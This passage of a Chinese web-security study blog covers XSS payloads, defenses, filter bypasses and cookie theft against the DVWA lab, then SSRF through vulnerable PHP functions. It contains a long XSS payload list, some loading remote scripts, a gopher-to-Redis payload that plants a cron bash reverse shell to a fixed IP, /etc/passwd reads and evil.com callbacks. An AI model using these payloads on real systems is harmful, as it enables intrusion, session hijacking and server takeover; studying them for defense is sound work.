class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(<span class="hljs-string">&#x27;hello，gaga!&#x27;</span>);&lt;/script&gt; //经典语句!<br> <br>&gt;<span class="hljs-string">&quot;&#x27;&gt;&lt;img src=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&gt;&quot;</span><span class="hljs-string">&#x27;&gt;&lt;script&gt;alert(&#x27;</span>XSS<span class="hljs-string">&#x27;)&lt;/script&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;table background=&#x27;</span>javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br> <br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br> <br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br> <br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br> <br>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br> <br>&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br> <br>%<span class="hljs-number">3</span>c/a%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>c/title%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e/index.html<br> <br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&quot;XSS&quot;)&gt;<br> <br>&lt;IMG SRC=&quot;jav    ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&quot;&lt;IMG src=&quot;/java&quot;\<span class="hljs-number">0</span>script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br> <br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br> <br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br> <br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br> <br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br> <br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;<span class="hljs-number">0</span>;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br> <br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br> <br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>behaviour: url(<span class="hljs-string">&#x27;http://www.how-to-hack.org/exploit.html&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>width: expression(alert(<span class="hljs-string">&#x27;XSS&#x27;</span>));<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;</span>XSS<span class="hljs-string">&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;</span>XSS<span class="hljs-string">&quot;))&#x27;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/javascript<span class="hljs-string">&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/css<span class="hljs-string">&quot;&gt;.XSS&#123;background-image:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. type=&quot;</span>text/css<span class="hljs-string">&quot;&gt;BODY&#123;background:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;BASE HREF=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);//<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">getURL(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">a=&quot;</span>get<span class="hljs-string">&quot;;b=&quot;</span>URL<span class="hljs-string">&quot;;c=&quot;</span>javascript.:<span class="hljs-string">&quot;;d=&quot;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;;eval(a+b+c+d);</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;XML SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&quot;</span>&gt; &lt;BODY NLOAD=<span class="hljs-string">&quot;a();&quot;</span>&gt;&lt;SCRIPT&gt;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>()&#123;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);&#125;&lt;/SCRIPT&gt;&lt;<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. SRC=&quot;</span>http://xss.ha.ckers.org/xss.jpg<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;&#x27;&#x27;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.&quot;</span>a=<span class="hljs-string">&#x27;&gt;&#x27;</span><span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT&gt;document.write(&quot;</span>&lt;SCRI<span class="hljs-string">&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4、XSS防御"><a href="#4、XSS防御" class="headerlink" title="4、XSS防御"></a>4、XSS防御</h3><ul><li><strong>验证</strong></li></ul><p><strong>思路：</strong>过滤用户输入，使浏览器解释代码而非恶意命令。其中，最重要的是过滤和净化有害的输入，如常见的敏感字符<code>&lt;&gt; &#39; &quot; &amp; # javascript</code>等。</p><ul><li><strong>编码</strong></li></ul><p><strong>思路：</strong>转义用户输入，使得浏览器仅解释数据而非代码。</p><blockquote><p>HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体替代字符，这样做可确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。</p><p>一些常见的可能造成问题的字符的HTML编码如下所示：</p><p><code>显示</code><code>实体名字</code><code>实体编号</code></p><p><code>&lt;</code><code>&amp;lt;</code><code>&amp;#60;</code></p><p><code>&gt;</code><code>&amp;gt;</code><code>&amp;#62;</code></p><p><code>&amp;</code><code>&amp;amp;</code>   <code>&amp;#38;</code></p><p><code>&quot;</code><code>&amp;quot;</code> <code>&amp;#34;</code></p></blockquote><ul><li><strong>XSS Filter（自编写脚本啦）</strong></li></ul><p>XSS Filter是防御跨站脚本攻击的主要手段之一，其作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。</p><p><a href="https://blog.csdn.net/qq_38118138/article/details/118081903">XSS过滤器Filter实现全过程</a></p><p><a href="https://blog.csdn.net/Code_shadow/article/details/103125060">使用Filter进行XSS过滤</a></p><h3 id="5、XSS绕过"><a href="#5、XSS绕过" class="headerlink" title="5、XSS绕过"></a>5、XSS绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>HTML对标签大小写不敏感，可以利用大小写混用绕过。</p><p>例如：<code>&lt;script&gt;改为&lt;ScRiPt&gt;</code></p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>有些情况下的规则会将黑名单标签替换为空，可以利用这一点构造标签。</p><p>例如：<code>&lt;script&gt;改为&lt;scr&lt;script&gt;ipt&gt;</code></p><p>同理，某些注释符在规则中也会替换为空，这时候可以利用它构造payload。</p><p>例如：<code>&lt;script&gt;改为&lt;scr&lt;!---test---&gt;ipt&gt;</code></p><h4 id="开口标签"><a href="#开口标签" class="headerlink" title="开口标签"></a>开口标签</h4><p>在某些特殊环境，由于html代码的补全机制，可以故意<code>不闭合标签</code>绕过黑名单检测例如：<code>&lt;script&gt;改为&lt;script</code></p><h4 id="空格回车Tab"><a href="#空格回车Tab" class="headerlink" title="空格回车Tab"></a>空格回车Tab</h4><p>例如：js伪协议<code>javascript:alert(&#39;xss&#39;);</code>可以改为<code>java script:alert(&#39;xss&#39;);</code>等</p><h4 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h4><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码。</p><blockquote><p>href、action、formaction、location、on*、name、background、poster</p></blockquote><h4 id="绕Waf"><a href="#绕Waf" class="headerlink" title="绕Waf"></a>绕Waf</h4><p>在url上添加代码：<code>&lt;Script sRC=&#39;//xxx/xx&#39;#ewqeqweq</code>，其中，空格可以使用<code>+</code>，其它的如果需要转义的话自行百度查询吧。</p><h4 id="使用其它标签（Waf）"><a href="#使用其它标签（Waf）" class="headerlink" title="使用其它标签（Waf）"></a>使用其它标签（Waf）</h4><blockquote><p><code>&lt;svg/onload = alert(1);&gt;</code></p></blockquote><h3 id="6、伪造身份登陆（XSS获取cookie并利用）"><a href="#6、伪造身份登陆（XSS获取cookie并利用）" class="headerlink" title="6、伪造身份登陆（XSS获取cookie并利用）"></a>6、伪造身份登陆（XSS获取cookie并利用）</h3><blockquote><p>实现流程：</p><p>1、注册一个在线xss平台账号，<a href="https://xss.yt/">https://xss.yt</a></p><p>2、创建项目，获取自己对应的XSS payload（其中的项目名称和项目描述随便写）</p><p>3、选择默认模块，默认模块是读取cookie，下一步。（可以选择超强默认模块啦，无需配置keepsession）</p><p>4、然后就会出现一些可植入js代码（可利用）</p><p>5、然后，使用浏览器打开dvwa靶场，将安全级别调到low。选择反射性xss，将上面的js代码复制一个到输入框中，进行测试。</p><p>6、回到xss平台，查看内容。展开，会发现登陆用的cookie</p><p>7、获取到cookie后，打开另外一个浏览器访问dvwa(模拟攻击者操作)，f12打开开发者工具，在”存储“中找到cookie值，记录其<code>PHPSESSION</code>值</p><p>8、将之前获取到的cookie值替换上去，把security的impossible改为low,回到登录界面，在url后面加上获取到的cookie信息（cookie&#x3D;security&#x3D;low; PHPSESSION&#x3D;记下的内容）。ps：url改为后台地址（cookie下的url地址）</p></blockquote><h2 id="③SSRF服务器端请求伪造"><a href="#③SSRF服务器端请求伪造" class="headerlink" title="③SSRF服务器端请求伪造"></a>③SSRF服务器端请求伪造</h2><h3 id="1、漏洞简介-1"><a href="#1、漏洞简介-1" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h3><p>· SSRF，服务器端请求伪造，是由攻击者构造请求，但由服务端发起请求的安全漏洞。本质上属于信息泄露漏洞。</p><p>· SSRF攻击的目标是：<code>从外网无法访问的内部系统</code>。（因为其由服务器端发起，所以它能够请求到与它相连而与外网隔离的内部系统，也就是把目标网站当作中间人）</p><p>· SSRF 形成的原因：<code>大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制 </code>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p><p>· 数据流：<code>攻击者</code>—-<code>服务器</code>—-<code>目标地址</code></p><blockquote><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议）</a></p><p><a href="https://blog.csdn.net/qq_44159028/article/details/114626708">SSRF (服务器端请求伪造) 漏洞原理与利用方式</a></p><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF-有面试相关内容</a></p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御-协议方面比较完善</a></p><p><a href="https://www.freebuf.com/vuls/365150.html">手把手用实战教你SSRF漏洞从入门到精通</a></p></blockquote><h3 id="2、漏洞产生"><a href="#2、漏洞产生" class="headerlink" title="2、漏洞产生"></a>2、漏洞产生</h3><h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><p>php中的以下函数使用不当容易导致SSRF：</p><ul><li><strong>file_get_contents()和readfile()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>// 传入URL地址<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];   <br>// 从URL地址中读取指定内容，并直接输出<br><span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);  <br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>file_get_content</code>函数从用户指定的url读取整个文件内容，然后直接使用echo命令输出展现给用户。</p><p>file_put_content()函数的作用是读取文件内容或者URL地址指定的内容。</p><p>！当传入的参数是内网文件的路径时（如在原url上添加构造路径<code>ssrf.php?url=../../../../../../etc/passwd</code>），就会造成文件读取，信息泄露 。一般这种攻击与目录遍历相结合。</p></blockquote><ul><li><strong>fsockopen()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) &#123; <br>    <span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>        &#125; <br>        fclose(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>fsockopen</code>函数主要实现：初始化一个套接字连接到指定主机（host）实现对用户指定url数据的获取。该函数使用socket（端口）跟服务器建立tcp连接，传输数据。</p><p><code>fsockopen</code>函数将返回一个句柄，该句柄之后可以被其它文件类函数调用（例如，fgets()、fgetss()、fwrite()、fclose()、feof()，如果调用失败，则返回false）</p><p>变量host为指定主机名，port为端口（主要根据服务而定），errstr表示错误信息将以字符串的信息返回，30为时限。</p><p>同样也是添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>即可成功触发ssrf，并返回目标域名主页。用处不算大。</p></blockquote><ul><li><strong>curl_exec()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = curl_init();// 创建新的 cURL 资源<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, 0);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项<br>    <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>);// 抓取 URL 并把它传递给浏览器<br>    curl_close(<span class="hljs-variable">$curlobj</span>);// 关闭 cURL 资源，并且释放系统资源<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.rand().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话。cURL通过PHP获取数据，并将获取到的文件数据保存至curled文件夹下的随机文件名文本文件中。</p><p>对于<code>curl_exec</code>的攻击方式：</p><ul><li>可以通过添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>触发其ssrf</li><li>通过<code>file、dict、gopher</code>这三个协议来进行渗透。（更常见的做法）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span> <br>curl -vvv <span class="hljs-string">&#x27;dict://127.0.0.1:6379/info&#x27;</span> <br><span class="hljs-comment"># 注意：链接使用单引号，避免$变量问题 </span><br>curl -vvv <span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></code></pre></td></tr></table></figure><p>其中，<code>curl</code> 是一个命令行工具，用于发送和接收数据，通常用于与网页和服务器进行交互。</p><p><code>-vvv</code> 参数表示输出详细的调试信息，有助于查看命令的执行过程和返回结果</p><p><code>dict://127.0.0.1:6379/info</code>指定使用dict协议，来模拟一个访问Redis服务的请求，后面的IP和端口号指的是本地主机地址和Redis默认的监听端口号，<code>/info</code>用于获取Redis服务器的信息和统计数据（Redis常用命令）</p><p><code>gopher</code> 是一种互联网协议，它允许通过 URL 方式进行数据传输。这里的<code>gopher://127.0.0.1:6379/</code> 指定了一个 Redis 服务器的地址和端口号。</p><p>接下来是一系列以 <code>%0d%0a</code> 结尾的数据块，这些块构成了一个特定的Redis命令序列。</p><p>有关于上述对gopher协议的利用代码主要利用了Redis未授权访问漏洞，时期允许攻击者执行任意命令，包括执行恶意代码。</p></blockquote><ul><li><strong>SoapClient类</strong></li></ul><p><a href="https://blog.csdn.net/qq_37376469/article/details/130024611">PHP中原生类SoapClient反序列化的SSRF利用</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a></p><blockquote><p>注意情况：</p><p>1.一般情况下PHP不会开启fopen的gopher wrapper </p><p>2.file_get_contents的gopher协议不能URL编码 </p><p>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 </p><p>4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 </p><p>5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转</p><p>6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</p></blockquote><h4 id="可利用协议"><a href="#可利用协议" class="headerlink" title="可利用协议"></a>可利用协议</h4><ul><li><strong>file协议</strong></li></ul><p>结合<code>目录遍历</code>读取文件，从文件系统中获取文件内容。如<code>file:///etc/passwd</code>，其中<code>/etc/passwd</code>是用户账户文件。</p><ul><li><strong>gopher协议</strong></li></ul><p>分布式文档传递服务，可以<code>打开端口</code>，可以使用<code>gopherus</code>生成<code>payload</code></p><ul><li><strong>dict协议</strong></li></ul><p>· 字典服务器协议，可以访问字典资源，如<code>dict:///ip:6739/info</code>，其中<code>info</code>是Redis的常用命令。</p><p>· 可以探测指纹信息，使用格式如下：</p><blockquote><p><strong>dict:&#x2F;&#x2F;ip:port&#x2F;命令:命令2:命令3</strong></p><p>其中，命令是可选字段，每个命令使用冒号隔开。</p><p>例：dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;set:passwd:123456</p><p>dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;get:passwd 等</p><p>在实际地址栏中，这些指令的显示效果为：</p><p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;set:passwd:123456</p><p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:22</p></blockquote><p>· 可以写入反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png" alt="image-20240719145304230"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png" alt="image-20240719145316045"></p><p>· 可以用于<code>结合cURL攻击</code></p><p>· 最主要的还是进行<code>端口探测</code>！例如：dict:&#x2F;&#x2F;127.0.0.1:80</p><ul><li><strong>http&#x2F;https协议</strong></li></ul><p>进行<code>内网探测</code></p><ul><li><strong>ftp协议（sftp、tftp）</strong></li></ul><p>进行<code>端口扫描</code>。</p><p>· sftp，代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）。这是一种与SSH打包在一起的独立协议，它运行在安全连接上，并以如下类似的方式进行工作。</p><blockquote><p>在目标网站执行：</p><p><a href="http://example.com/ssrf.php?url=sftp://evil.com:9999/">http://example.com/ssrf.php?url=sftp://evil.com:9999/</a></p><p><code>evil.com</code>指代目标网站的域名或IP地址，其后冒号跟着的是自己设置的监听端口号。</p><p>在本地（如kali）终端开启监听，等待来自目标服务器的连接：</p><p>local:$ nc -lvvp 9999</p><p>Connection from [192.168.0.12] port 9999[tcp&#x2F;*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p><p>nc命令的输出表明（是别人的输出捏）攻击者已经成功接受了来自目标服务器的连接，即连接被建立了。</p></blockquote><p>· tftp，（Trivial File Transfer Protocol,简单文件传输协议），是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><blockquote><p>在目标网站执行：</p><p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a></p><p>其中，<code>TESTUDPPACKET</code>是一个UDP数据包</p><p>local:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><h3 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h3><h4 id="漏洞验证方式"><a href="#漏洞验证方式" class="headerlink" 